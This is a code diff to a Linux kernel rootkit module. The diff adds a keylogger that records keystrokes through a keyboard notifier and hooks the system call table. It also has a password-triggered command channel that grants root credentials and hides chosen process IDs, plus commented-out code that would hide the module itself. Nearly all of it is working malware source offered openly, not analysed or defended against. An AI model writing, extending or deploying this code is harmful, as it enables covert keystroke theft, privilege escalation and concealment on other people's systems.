@@ -39,6 +39,10 @@
 #include <linux/version.h>
 #include <linux/namei.h>
 
+//keylogger includes
+#include <linux/keyboard.h>
+#include <linux/reboot.h>
+#include <linux/input.h>
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
     LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)
@@ -109,7 +113,43 @@ MODULE_AUTHOR("Maxim Biro <nurupo.contributions@gmail.com>");
 #error ARCH_ERROR_MESSAGE
 #endif
 
+//header for system call table
 void **sys_call_table;
+
+//header of execute command
+int execute_command(const char __user *str, size_t length);
+
+//////////////////////////////////////////////////////////////////////////////////////keylogger////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+//@RESOURCES https://github.com/Fedeorlandau/simple-keylogger-lkm
+//mapping for keyboard keys
+const char CH_TABLE[] = {
+    '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '?',
+    '?', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '?',
+    'X', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '?', 'X',
+    'X', '?', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', 'z'};
+
+/*event function print every key storke for chars presented in the table*/
+static int on_key_event(struct notifier_block *nblock, unsigned long code, void *param0)
+{
+    struct keyboard_notifier_param *param = param0;
+    if (code == KBD_KEYCODE && param->down)
+    {
+        int char_index = param->value - KEY_1;
+        if (char_index >= 0 && char_index < sizeof(CH_TABLE))
+        {
+            printk(KERN_INFO "Key %c \n", CH_TABLE[char_index]);
+        }
+    }
+    return NOTIFY_OK;
+}
+
+struct notifier_block nb = {
+    .notifier_call = on_key_event
+};
+
+//////////////////////////////////////////////////////////////////////////////////////end////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////////////////////end keylogger////////////////////////////////////////////////////////////
 
 /**
  * Finds a system call table based on a heruistic.
@@ -258,22 +298,18 @@ void hook_remove_all(void)
 
 // ========== END HOOK LIST ==========
 
-unsigned long read_count = 0;
 
 asmlinkage long read(unsigned int fd, char __user *buf, size_t count)
 {
-    read_count++;
 
     asmlinkage long (*original_read)(unsigned int, char __user *, size_t);
     original_read = hook_get_original(read);
     return original_read(fd, buf, count);
 }
 
-unsigned long write_count = 0;
 
 asmlinkage long write(unsigned int fd, const char __user *buf, size_t count)
 {
-    write_count++;
 
     asmlinkage long (*original_write)(unsigned int, const char __user *, size_t);
     original_write = hook_get_original(write);
@@ -424,11 +460,9 @@ void asm_hook_remove_all(void)
 
 // ========== END ASM HOOK LIST ==========
 
-unsigned long asm_rmdir_count = 0;
 
 asmlinkage long asm_rmdir(const char __user *pathname)
 {
-    asm_rmdir_count++;
 
     asmlinkage long (*original_rmdir)(const char __user *);
     original_rmdir = asm_hook_unpatch(asm_rmdir);
@@ -456,7 +490,7 @@ int pid_add(const char *pid)
     {
         return 0;
     }
-
+    //string to long
     p->pid = simple_strtoul(pid, NULL, 10);
 
     list_add(&p->list, &pid_list);
@@ -583,8 +617,6 @@ READDIR_HOOK_END(sys)
 
 // ========== END READDIR ==========
 
-
-
 static char *proc_to_hide = "7821";
 static struct file_operations proc_fops;
 static struct file_operations *backup_proc_fops;
@@ -593,22 +625,23 @@ static struct path p;
 
 struct dir_context *backup_ctx;
 
-static int rk_filldir_t(struct dir_context *ctx, const char *proc_name, int len,
-                        loff_t off, u64 ino, unsigned int d_type)
+static int filldir_modified(struct dir_context *ctx, const char *proc_name, int len,
+                            loff_t off, u64 ino, unsigned int d_type)
 {
+    //do not call it
     if (strncmp(proc_name, proc_to_hide, strlen(proc_to_hide)) == 0)
         return 0;
 
+    //call original function
     return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
 }
 
 struct dir_context rk_ctx = {
-    .actor = rk_filldir_t,
+    .actor = filldir_modified,
 };
 
-
 /* replace original iterate in linx*/
-int rk_iterate_shared(struct file *file, struct dir_context *ctx)
+int iterate_modified(struct file *file, struct dir_context *ctx)
 {
     int result = 0;
     rk_ctx.pos = ctx->pos;
@@ -617,70 +650,6 @@ int rk_iterate_shared(struct file *file, struct dir_context *ctx)
     ctx->pos = rk_ctx.pos;
 
     return result;
-}
-
-
-
-
-int execute_command(const char __user *str, size_t length)
-{
-    if (length <= sizeof(CFG_PASS) ||
-        strncmp(str, CFG_PASS, sizeof(CFG_PASS)) != 0)
-    {
-        return 0;
-    }
-
-    pr_info("Password check passed\n");
-
-    // since the password matched, we assume the command following the password
-    // is in the valid format
-
-    str += sizeof(CFG_PASS);
-
-    if (strcmp(str, CFG_ROOT) == 0)
-    {
-        pr_info("Got root command\n");
-        struct cred *creds = prepare_creds();
-        creds->uid.val = creds->euid.val = 0;
-        creds->gid.val = creds->egid.val = 0;
-        commit_creds(creds);
-    }
-    else if (strcmp(str, CFG_HIDE_PID) == 0)
-    {
-        pr_info("Got hide pid command\n");
-        str += sizeof(CFG_HIDE_PID);
-        proc_to_hide = str;
-        pr_info("Got hide pid command \n");
-
-        //str now points to the id of the process
-        if (kern_path("/proc", 0, &p))
-            return 0;
-
-        /* get the inode*/
-        proc_inode = p.dentry->d_inode;
-
-        /* get a copy of file_operations from inode */
-        proc_fops = *proc_inode->i_fop;
-        /* backup the file_operations */
-        backup_proc_fops = proc_inode->i_fop;
-        /* modify the copy with out evil function */
-        proc_fops.iterate = rk_iterate_shared;
-        /* overwrite the active file_operations */
-        proc_inode->i_fop = &proc_fops;
-
-        // pid_add(str);
-    }
-    else if (strcmp(str, CFG_HIDE) == 0)
-    {
-        pr_info("Got hide command\n");
-        // hide();
-    }
-    else
-    {
-        pr_info("Got unknown command\n");
-    }
-
-    return 1;
 }
 
 // ========== COMM CHANNEL ==========
@@ -712,6 +681,69 @@ static ssize_t proc_fops_read(struct file *file, char __user *buf_user, size_t c
     return ret;
 }
 
+int execute_command(const char __user *str, size_t length)
+{
+    if (length <= sizeof(CFG_PASS) ||
+        strncmp(str, CFG_PASS, sizeof(CFG_PASS)) != 0)
+    {
+        return 0;
+    }
+
+    pr_info("Password check passed\n");
+
+    // since the password matched, we assume the command following the password
+    // is in the valid format
+
+    str += sizeof(CFG_PASS);
+
+    if (strcmp(str, CFG_ROOT) == 0)
+    {
+        pr_info("Got root command\n");
+        struct cred *creds = prepare_creds();
+        creds->uid.val = creds->euid.val = 0;
+        creds->gid.val = creds->egid.val = 0;
+        commit_creds(creds);
+    }
+    else if (strcmp(str, CFG_HIDE_PID) == 0)
+    {
+        pr_info("Got hide pid command\n");
+        str += sizeof(CFG_HIDE_PID);
+        proc_to_hide = str;
+        pr_info("Got hide pid command \n");
+        // int (*original_write)(struct file *, const char __user *, size_t, loff_t *);
+        // original_write = asm_hook_unpatch(proc_fops_write);
+        // ssize_t ret = original_write(file, buf_user, count, p);
+        //str now points to the id of the process
+        // if (kern_path("/proc", 0, &p))
+        //     return 0;
+
+        // /* get the inode*/
+        // proc_inode = p.dentry->d_inode;
+
+        // /* get a copy of file_operations from inode */
+        // proc_fops = *proc_inode->i_fop;
+        // /* backup the file_operations */
+        // backup_proc_fops = proc_inode->i_fop;
+        // /* modify the copy with out evil function */
+        // proc_fops.iterate = iterate_modified;
+        // /* overwrite the active file_operations */
+        // proc_inode->i_fop = &proc_fops;
+
+        // undo changes
+        // proc_inode = p.dentry->d_inode;
+        // proc_inode->i_fop = backup_proc_fops;
+
+        //  asm_hook_patch(proc_fops_write);
+        pid_add(str);
+        return 0;
+    }
+    else
+    {
+        pr_info("Got unknown command\n");
+    }
+
+    return 1;
+}
 int setup_proc_comm_channel(void)
 {
     static const struct file_operations proc_file_fops = {0};
@@ -770,35 +802,21 @@ found:;
     return 1;
 }
 
-// // static ssize_t devnull_fops_write(struct file *file, const char __user *buf_user, size_t count, loff_t *p)
-// // {
-// //     if (execute_command(buf_user, count)) {
-// //         return count;
-// //     }
-
-// //     int (*original_write)(struct file *, const char __user *, size_t, loff_t *);
-// //     original_write = hook_get_original(devnull_fops_write);
-// //     return original_write(file, buf_user, count, p);
-// // }
-
-// int setup_devnull_comm_channel(void)
-// {
-//     hook_create(&get_fop("/dev/null")->write, devnull_fops_write);
-
-//     return 1;
-// }
-
 // ========== END COMM CHANNEL ==========
 
 int init(void)
 {
     pr_info("Module loaded\n");
 
-      /*invisble kernel module*/
+    /*invisble kernel module*/
     // list_del_init(&__this_module.list);
     // kobject_del(&THIS_MODULE->mkobj.kobj);
     // printk("invisible: module loaded\n");
     /*end invisible lsmod kernel*/
+    /*keylogger listener setup*/
+     register_keyboard_notifier(&nb);
+
+
 
     if (!setup_proc_comm_channel())
     {
@@ -825,13 +843,16 @@ int init(void)
 
 void exit(void)
 {
-    pr_info("sys_rmdir was called %lu times\n", asm_rmdir_count);
-    pr_info("sys_read was called %lu times\n", read_count);
-    pr_info("sys_write was called %lu times\n", write_count);
+    /*un register keylogger*/
 
+    //  if(kern_path("/proc", 0, &p))
+    //     return;
+    // proc_inode = p.dentry->d_inode;
+    // proc_inode->i_fop = backup_proc_fops;
     hook_remove_all();
     asm_hook_remove_all();
-
+    
+    unregister_keyboard_notifier(&nb);
     THIS_MODULE->name[0] = 0;
 
     pr_info("Module removed\n");
